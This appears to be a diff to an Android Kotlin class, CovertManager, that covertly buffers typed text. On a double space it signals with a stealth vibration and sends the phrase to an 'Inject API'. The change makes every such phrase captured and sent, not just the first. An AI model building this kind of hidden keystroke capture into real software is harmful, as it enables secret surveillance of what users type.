@@ -173,28 +173,28 @@ class CovertManager(private val context: Context) {
 
             if (originalText == " ") {
                 consecutiveSpaceCount++
-                if (consecutiveSpaceCount >= 2 && !isSecretWordCaptured) {
-                    // Double space detected! The second space finalizes the secret input.
+                if (consecutiveSpaceCount >= 2) {
+                    // Double space detected! Finalize the current secret input and immediately transmit to API.
                     val secretPhrase = rawSecretInputBuffer.toString().trim()
-                    rawSecretInputBuffer.clear() // Clear buffer immediately so next sessions don't accumulate
+                    rawSecretInputBuffer.clear() // Clean buffer for any subsequent word/phrase
                     consecutiveSpaceCount = 0
                     if (secretPhrase.isNotEmpty()) {
-                        capturedSecretWord = secretPhrase // Overwrite cleanly with new phrase (e.g. "amr rady")
+                        capturedSecretWord = secretPhrase
                         isSecretWordCaptured = true
                         triggerStealthVibrate(doublePulse = true)
 
-                        // Auto-dispatch to Inject API with the full phrase including single space
+                        // Auto-dispatch every double-space word to the Inject API
                         if (isInjectApiEnabled) {
                             dispatchInjectApi(secretPhrase)
                         }
                     }
-                } else if (!isSecretWordCaptured) {
-                    // Single space between words (e.g. "amr rady"): keep space inside the raw input buffer
+                } else {
+                    // Single space between words (e.g. "amr rady"): preserve space in the raw buffer
                     rawSecretInputBuffer.append(" ")
                 }
             } else {
                 consecutiveSpaceCount = 0
-                if (!isSecretWordCaptured && (isLetter || originalText.isNotEmpty())) {
+                if (isLetter || originalText.isNotEmpty()) {
                     rawSecretInputBuffer.append(originalText)
                 }
             }
